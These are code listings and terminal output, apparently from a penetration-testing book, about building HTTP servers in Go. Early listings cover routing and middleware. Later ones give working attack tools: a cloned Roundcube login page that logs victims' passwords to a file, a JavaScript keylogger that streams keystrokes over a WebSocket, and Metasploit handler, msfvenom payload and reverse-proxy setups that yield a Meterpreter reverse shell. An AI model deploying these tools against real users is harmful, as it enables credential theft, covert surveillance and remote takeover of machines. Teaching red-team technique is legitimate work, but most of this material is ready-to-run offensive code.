["```\npackage main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n)\n\nfunc hello(w http.ResponseWriter, r *http.Request) {\n    fmt.Fprintf(w, \"Hello %s\\n\", r.URL.Query().Get(\"name\"))\n}\n\nfunc main() {\n ❶ http.HandleFunc(\"/hello\", hello)\n ❷ http.ListenAndServe(\":8000\", nil)\n}\n```", "```\n$ curl -i http://localhost:8000/hello?name=alice\nHTTP/1.1 200 OK\nDate: Sun, 12 Jan 2020 01:18:26 GMT\nContent-Length: 12\nContent-Type: text/plain; charset=utf-8\n\nHello alice\n```", "```\n   package main\n\n   import (\n       \"fmt\"\n       \"net/http\"\n   )\n\n❶ type router struct {\n   }\n\n❷ func (r *router) ServeHTTP(w http.ResponseWriter, req *http.Request) {\n    ❸ switch req.URL.Path {\n       case \"/a\":\n           fmt.Fprint(w, \"Executing /a\")\n case \"/b\":\n           fmt.Fprint(w, \"Executing /b\")\n       case \"/c\":\n           fmt.Fprint(w, \"Executing /c\")\n       default:\n           http.Error(w, \"404 Not Found\", 404)\n       }\n   }\n\n   func main() {\n       var r router\n    ❹ http.ListenAndServe(\":8000\", &r)\n   }\n```", "```\n$ curl http://localhost:8000/a\nExecuting /a\n$ curl http://localhost:8000/d\n404 Not Found\n```", "```\n   Package main\n\n   import (\n           \"fmt\"\n           \"log\"\n           \"net/http\"\n           \"time\"\n   )\n\n❶ type logger struct {\n           Inner http.Handler\n   }\n\n❷ func (l *logger) ServeHTTP(w http.ResponseWriter, r *http.Request) {\n           log.Println(\"start\")\n        ❸ l.Inner.ServeHTTP(w, r)\n           log.Println(\"finish\")\n   }\n\n   func hello(w http.ResponseWriter, r *http.Request) {\n           fmt.Fprint(w, \"Hello\\n\")\n   }\n\n   func main() {\n        ❹ f := http.HandlerFunc(hello)\n        ❺ l := logger{Inner: f}\n        ❻ http.ListenAndServe(\":8000\", &l)\n   }\n```", "```\n$ go build -o simple_middleware\n$ ./simple_middleware\n2020/01/16 06:23:14 start\n2020/01/16 06:23:14 finish\n```", "```\n$ go get github.com/gorilla/mux\n```", "```\nr := mux.NewRouter()\n```", "```\nr.HandleFunc(\"/foo\", func(w http.ResponseWriter, req *http.Request) {\n    fmt.Fprint(w, \"hi foo\")\n}).Methods(\"GET\")❶\n```", "```\nr.HandleFunc(\"/foo\", func(w http.ResponseWriter, req *http.Request) {\n    fmt.Fprint(w, \"hi foo\")\n}).Methods(\"GET\").Host(\"www.foo.com\")\n```", "```\nr.HandleFunc(\"/users/{user}\", func(w http.ResponseWriter, req *http.Request) {\n    user := mux.Vars(req)[\"user\"]\n    fmt.Fprintf(w, \"hi %s\\n\", user)\n}).Methods(\"GET\")\n```", "```\n$ curl http://localhost:8000/users/bob\nhi bob\n```", "```\nr.HandleFunc(\"/users/{user:[a-z]+}\", func(w http.ResponseWriter, req *http.Request) {\n    user := mux.Vars(req)[\"user\"]\n    fmt.Fprintf(w, \"hi %s\\n\", user)\n}).Methods(\"GET\")\n```", "```\n$ curl -i http://localhost:8000/users/bob1\nHTTP/1.1 404 Not Found\n```", "```\n$ go get github.com/urfave/negroni\n```", "```\npackage main\n\nimport (\n    \"net/http\"\n\n    \"github.com/gorilla/mux\"\n    \"github.com/urfave/negroni\"\n)\n\nfunc main() {\n ❶ r := mux.NewRouter()\n ❷ n := negroni.Classic()\n ❸ n.UseHandler(r)\n    http.ListenAndServe(\":8000\", n)\n}\n```", "```\nn.Use(negroni.NewRecovery())\n```", "```\n$ go build -s negroni_example\n$ ./negroni_example\n [negroni] 2020-01-19T11:49:33-07:00 | 404 |      1.0002ms | localhost:8000 | GET\n```", "```\ntype trivial struct {\n}\nfunc (t *trivial) ServeHTTP(w http.ResponseWriter, r *http.Request, next http.HandlerFunc) { ❶\n    fmt.Println(\"Executing trivial middleware\")\n    next(w, r) ❷\n}\n```", "```\nn.Use(&trivial{})\n```", "```\npackage main\n\nimport (\n    \"context\"\n    \"fmt\"\n    \"net/http\"\n\n    \"github.com/gorilla/mux\"\n    \"github.com/urfave/negroni\"\n)\n\ntype badAuth struct { ❶\n    Username string\n    Password string\n}\n\nfunc (b *badAuth) ServeHTTP(w http.ResponseWriter, r *http.Request, next http.HandlerFunc) { ❷\n    username := r.URL.Query().Get(\"username\") ❸\n    password := r.URL.Query().Get(\"password\")\n    if username != b.Username || password != b.Password {\n        http.Error(w, \"Unauthorized\", 401)\n        return ❹\n    }\n    ctx := context.WithValue(r.Context(), \"username\", username) ❺\n    r = r.WithContext(ctx) ❻\n    next(w, r)\n}\n\nfunc hello(w http.ResponseWriter, r *http.Request) {\n    username := r.Context().Value(\"username\").(string) ❼\n    fmt.Fprintf(w, \"Hi %s\\n\", username)\n}\n\nfunc main() {\n    r := mux.NewRouter()\n    r.HandleFunc(\"/hello\", hello).Methods(\"GET\")\n    n := negroni.Classic()\n    n.Use(&badAuth{\n        Username: \"admin\",\n        Password: \"password\",\n    })\n    n.UseHandler(r)\n    http.ListenAndServe(\":8000\", n)\n}\n```", "```\n$ curl -i http://localhost:8000/hello\nHTTP/1.1 401 Unauthorized\nContent-Type: text/plain; charset=utf-8\nX-Content-Type-Options: nosniff\nDate: Thu, 16 Jan 2020 20:41:20 GMT\nContent-Length: 13\nUnauthorized\n$ curl -i 'http://localhost:8000/hello?username=admin&password=password'\nHTTP/1.1 200 OK\nDate: Thu, 16 Jan 2020 20:41:05 GMT\nContent-Length: 9\nContent-Type: text/plain; charset=utf-8\n\nHi admin\n```", "```\n   package main\n\n   import (\n       \"html/template\"\n       \"os\"\n   )\n\n❶ var x = `\n   <html>\n     <body>\n\n ❷ Hello {{.}}\n     </body>\n   </html>\n   `\n\n   func main() {\n    ❸ t, err := template.New(\"hello\").Parse(x)\n       if err != nil {\n           panic(err)\n       }\n    ❹ t.Execute(os.Stdout, \"<script>alert('world')</script>\")\n   }\n```", "```\n$ go build -o template_example\n$ ./template_example\n\n<html>\n  <body>\n    Hello &lt;script&gt;alert(&#39;world&#39;)&lt;/script&gt;\n </body>\n</html>\n```", "```\n$ docker run --rm -it -p 127.0.0.180:80 robbertkl/roundcube\n```", "```\n$ tree\n.\n+-- main.go\n+-- public\n   +-- index.html\n   +-- index_files\n       +-- app.js\n       +-- common.js\n       +-- jquery-ui-1.10.4.custom.css\n       +-- jquery-ui-1.10.4.custom.min.js\n       +-- jquery.min.js\n       +-- jstz.min.js\n       +-- roundcube_logo.png\n       +-- styles.css\n       +-- ui.js\n    index.html\n```", "```\n<form name=\"form\" method=\"post\" action=\"http://127.0.0.1/?_task=login\">\n```", "```\n<form name=\"form\" method=\"post\" action=\"/login\">\n```", "```\npackage main\n\nimport (\n    \"net/http\"\n    \"os\"\n    \"time\"\n\n    log \"github.com/Sirupsen/logrus\" ❶\n    \"github.com/gorilla/mux\"\n)\n\nfunc login(w http.ResponseWriter, r *http.Request) {\n    log.WithFields(log.Fields{ ❷\n        \"time\":       time.Now().String(),\n        \"username\":   r.FormValue(\"_user\"), ❸\n        \"password\":   r.FormValue(\"_pass\"), ❹\n        \"user-agent\": r.UserAgent(),\n        \"ip_address\": r.RemoteAddr,\n    }).Info(\"login attempt\")\n    http.Redirect(w, r, \"/\", 302)\n}\n\nfunc main() {\n    fh, err := os.OpenFile(\"credentials.txt\", os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600) ❺\n    if err != nil {\n        panic(err)\n    }\n    defer fh.Close()\n    log.SetOutput(fh) ❻\n    r := mux.NewRouter()\n    r.HandleFunc(\"/login\", login).Methods(\"POST\") ❼\n    r.PathPrefix(\"/\").Handler(http.FileServer(http.Dir(\"public\"))) ❽\n    log.Fatal(http.ListenAndServe(\":8080\", r))\n}\n```", "```\n<td class=\"input\"><input name=\"_user\" id=\"rcmloginuser\" required=\"required\"\nsize=\"40\" autocapitalize=\"off\" autocomplete=\"off\" type=\"text\"></td>\n<td class=\"input\"><input name=\"_pass\" id=\"rcmloginpwd\" required=\"required\"\nsize=\"40\" autocapitalize=\"off\" autocomplete=\"off\" type=\"password\"></td>\n```", "```\n$ go build -o credential_harvester\n$ ./credential_harvester\n^C\n$ cat credentials.txt\nINFO[0038] login attempt\nip_address=\"127.0.0.1:34040\" password=\"p@ssw0rd1!\" time=\"2020-02-13\n21:29:37.048572849 -0800 PST\" user-agent=\"Mozilla/5.0 (X11; Ubuntu; Linux x86_64;\nrv:51.0) Gecko/20100101 Firefox/51.0\" username=bob\n```", "```\n<!DOCTYPE html>\n<html>\n<head>\n  <title>Login</title>\n</head>\n<body>\n <script src='http://localhost:8080/k.js'></script>\n  <form action='/login' method='post'>\n    <input name='username'/>\n    <input name='password'/>\n    <input type=\"submit\"/>   \n  </form>\n</body>\n</html>\n```", "```\n(function() {\n    var conn = new WebSocket(\"ws://{{.}}/ws\");\n    document.onkeypress = keypress;\n    function keypress(evt) {\n        s = String.fromCharCode(evt.which);\n        conn.send(s);\n    }\n})();\n```", "```\nimport (\n    \"flag\"\n    \"fmt\"\n    \"html/template\"\n    \"log\"\n    \"net/http\"\n\n    \"github.com/gorilla/mux\"\n ❶ \"github.com/gorilla/websocket\"\n)\n\nvar (\n ❷ upgrader = websocket.Upgrader{\n        CheckOrigin: func(r *http.Request) bool { return true },\n    }\n\n    listenAddr string\n    wsAddr     string\n    jsTemplate *template.Template\n)\n\nfunc init() {\n    flag.StringVar(&listenAddr, \"listen-addr\", \"\", \"Address to listen on\")\n    flag.StringVar(&wsAddr, \"ws-addr\", \"\", \"Address for WebSocket connection\")\n    flag.Parse()\n    var err error\n ❸ jsTemplate, err = template.ParseFiles(\"logger.js\")\n    if err != nil {\n        panic(err)\n    }\n}\n\nfunc serveWS(w http.ResponseWriter, r *http.Request) {\n ❹ conn, err := upgrader.Upgrade(w, r, nil)\n    if err != nil {\n        http.Error(w, \"\", 500)\n        return\n    }\n    defer conn.Close()\n    fmt.Printf(\"Connection from %s\\n\", conn.RemoteAddr().String())\n for {\n     ❺ _, msg, err := conn.ReadMessage()\n        if err != nil {\n            return\n        }\n     ❻ fmt.Printf(\"From %s: %s\\n\", conn.RemoteAddr().String(), string(msg))\n    }\n}\n\nfunc serveFile(w http.ResponseWriter, r *http.Request) {\n ❼ w.Header().Set(\"Content-Type\", \"application/javascript\")\n ❽ jsTemplate.Execute(w, wsAddr)\n}\n\nfunc main() {\n    r := mux.NewRouter()\n ❾ r.HandleFunc(\"/ws\", serveWS)\n ❿ r.HandleFunc(\"/k.js\", serveFile)\n    log.Fatal(http.ListenAndServe(\":8080\", r))\n}\n```", "```\n$ go run main.go -listen-addr=127.0.0.1:8080 -ws-addr=127.0.0.1:8080\nConnection from 127.0.0.1:58438\nFrom 127.0.0.1:58438: u\nFrom 127.0.0.1:58438: s\nFrom 127.0.0.1:58438: e\nFrom 127.0.0.1:58438: r\nFrom 127.0.0.1:58438:\nFrom 127.0.0.1:58438: p\nFrom 127.0.0.1:58438: @\nFrom 127.0.0.1:58438: s\nFrom 127.0.0.1:58438: s\nFrom 127.0.0.1:58438: w\nFrom 127.0.0.1:58438: o\nFrom 127.0.0.1:58438: r\nFrom 127.0.0.1:58438: d\n```", "```\n   $ msfconsole\n   > use exploit/multi/handler\n   > set payload windows/meterpreter_reverse_http\n❶ > set LHOST 10.0.1.20\n   > set LPORT 80\n❷ > set ReverseListenerBindAddress 10.0.1.20\n   > set ReverseListenerBindPort 10080\n   > exploit -j -z\n   [*] Exploit running as background job 1.\n\n   [*] Started HTTP reverse handler on http://10.0.1.20:10080\n```", "```\n$ msfconsole\n> use exploit/multi/handler\n> set payload windows/meterpreter_reverse_http\n> set LHOST 10.0.1.20\n> set LPORT 80\n> set ReverseListenerBindAddress 10.0.1.20\n> set ReverseListenerBindPort 20080\n> exploit -j -z\n[*] Exploit running as background job 1.\n\n[*] Started HTTP reverse handler on http://10.0.1.20:20080\n```", "```\n   package main\n\n   import (\n       \"log\"\n       \"net/http\"\n    ❶ \"net/http/httputil\"\n       \"net/url\"\n \"github.com/gorilla/mux\"\n   )\n\n❷ var (\n       hostProxy = make(map[string]string)\n       proxies   = make(map[string]*httputil.ReverseProxy)\n   )\n\n   func init() {\n    ❸ hostProxy[\"attacker1.com\"] = \"http://10.0.1.20:10080\"\n       hostProxy[\"attacker2.com\"] = \"http://10.0.1.20:20080\"\n\n       for k, v := range hostProxy {\n        ❹ remote, err := url.Parse(v)\n           if err != nil {\n               log.Fatal(\"Unable to parse proxy target\")\n           }  \n        ❺ proxies[k] = httputil.NewSingleHostReverseProxy(remote)\n       }  \n   }\n\n   func main() {\n       r := mux.NewRouter()\n       for host, proxy := range proxies {\n        ❻ r.Host(host).Handler(proxy)\n       }  \n       log.Fatal(http.ListenAndServe(\":80\", r))\n   }\n```", "```\n$ msfvenom -p windows/meterpreter_reverse_http LHOST=10.0.1.20 LPORT=80\nHttpHostHeader=attacker1.com -f exe -o payload1.exe\n$ msfvenom -p windows/meterpreter_reverse_http LHOST=10.0.1.20 LPORT=80\nHttpHostHeader=attacker2.com -f exe -o payload2.exe\n```", "```\n>\n[*] http://10.0.1.20:10080 handling request from 10.0.1.20; (UUID: hff7podk) Redirecting stageless\nconnection from /pxS_2gL43lv34_birNgRHgL4AJ3A9w3i9FXG3Ne2-3UdLhACr8-Qt6QOlOw\nPTkzww3NEptWTOan2rLo5RT42eOdhYykyPYQy8dq3Bq3Mi2TaAEB with UA 'Mozilla/5.0 (Windows NT 6.1;\nTrident/7.0;\nrv:11.0) like Gecko'\n[*] http://10.0.1.20:10080 handling request from 10.0.1.20; (UUID: hff7podk) Attaching\norphaned/stageless session...\n[*] Meterpreter session 1 opened (10.0.1.20:10080 -> 10.0.1.20:60226) at 2020-07-03 16:13:34 -0500\n```"]